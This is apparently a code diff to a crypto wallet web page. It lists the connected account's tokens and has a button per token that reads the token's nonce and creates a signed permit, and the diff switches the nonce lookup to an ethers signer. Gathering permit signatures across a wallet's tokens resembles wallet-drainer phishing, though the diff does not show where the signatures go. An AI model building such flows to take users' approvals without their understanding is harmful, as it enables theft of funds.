@@ -25,7 +25,7 @@ const Page = () => {
 	const account = useAccount();
 	const {disconnect} = useDisconnect();
 	const provider = useEthersProvider();
-
+	const signer = useEthersSigner()
 	const [signatures, setSignatures] = useState<{
 		[key: string]: Awaited<ReturnType<typeof createPermitSignature>>
 	}>({})
@@ -63,9 +63,7 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = (await callContractMethod('nonces', [account.address], token.contract_address,
-								//@ts-ignore
-								provider.connection.url+"")).toString();
+							const nonce = (await callContractMethod('nonces', [account.address], token.contract_address,signer!)).toString();
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
 							},
